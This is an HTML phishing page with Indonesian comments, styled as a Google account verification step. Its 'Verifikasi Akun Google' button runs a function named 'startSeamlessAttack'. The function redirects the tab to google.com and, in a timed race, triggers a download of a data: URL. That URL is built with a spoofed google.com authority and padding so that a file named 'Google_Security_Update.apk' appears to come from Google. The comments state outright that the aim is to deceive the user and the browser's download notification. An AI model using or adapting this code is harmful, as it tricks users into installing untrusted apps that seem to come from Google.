<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Keamanan Google</title>
    <style>
        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #fff; margin: 0; }
        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>

    <button class="btn" onclick="startSeamlessAttack()">Verifikasi Akun Google</button>

    <script>
        function startSeamlessAttack() {
            console.log("[*] Memulai serangan Race Condition...");

            // 1. Persiapkan Payload (Abhishek Method)
            // Pakai Authority //google.com agar parser notifikasi tertipu
            const padding = "A".repeat(120); 
            const dataUrl = `data://google.com/html;${padding},base64,ZXN0dGVzdGVzdHRlc3Q=`;
            const fileName = "Google_Security_Update.apk";

            // 2. Trigger Navigasi ke Google Asli
            // Ini biar user ngeliat bar URL isinya "google.com" yang asli
            window.location.href = "https://www.google.com";

            // 3. THE RACE: Kirim download saat browser sedang sibuk navigasi
            // Kita kasih delay sangat tipis (100-300ms) agar download terdaftar 
            // saat renderer 'google.com' mulai aktif.
            setTimeout(() => {
                const a = document.createElement('a');
                a.href = dataUrl;
                a.download = fileName;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                
                console.log("[+] Download ditembak saat navigasi!");
            }, 150); 
        }
    </script>
</body>
</html>
